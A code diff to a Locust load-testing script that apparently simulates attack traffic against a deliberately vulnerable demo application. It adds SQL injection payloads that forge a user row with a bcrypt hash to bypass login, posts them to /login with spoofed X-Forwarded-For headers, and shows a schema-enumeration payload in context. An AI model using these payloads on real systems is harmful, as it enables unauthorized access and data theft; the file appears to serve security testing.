@@ -113,6 +113,11 @@ SQL_CMDS_USERNAME = [
     "' and 1 = 0 UNION SELECT TABLE_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES;--"
 ]
 
+SQL_CMDS_LOGIN_USERNAME = [
+    "\" OR 1 = 0 UNION ALL SELECT \"user\", \"$2b$10$y5LKMIUxQO8B0CllON63UunVV3xEdRxfHQ3Ocy1SUd6fbxgFxJe1u\", 1  FROM DUAL#",
+    "\" OR 1 = 0 UNION ALL SELECT \"user\", \"$2b$10$y5LKMIUxQO8B0CllON63UunVV3xEdRxfHQ3Ocy1SUd6fbxgFxJe1u\", 2  FROM DUAL#"
+]
+
 WAIT_TIME = int(os.environ['WAIT_TIME'])
 
 class UnguardUser(HttpUser):
@@ -168,6 +173,14 @@ class UnguardUser(HttpUser):
 
         # get with the malicious SQL command
         self.client.get("/users", params=sql_username, headers=self.get_random_x_forwarded_for_header())
+        time.sleep(1)
+
+    @task()
+    def get_sql_nodejs(self):
+        parameters = {'name': random.choice(SQL_CMDS_LOGIN_USERNAME), 'password': 'user'}
+
+        # post with the malicious SQL command
+        self.client.post("/login", params=parameters, headers=self.get_random_x_forwarded_for_header())
         time.sleep(1)
 
     @task()
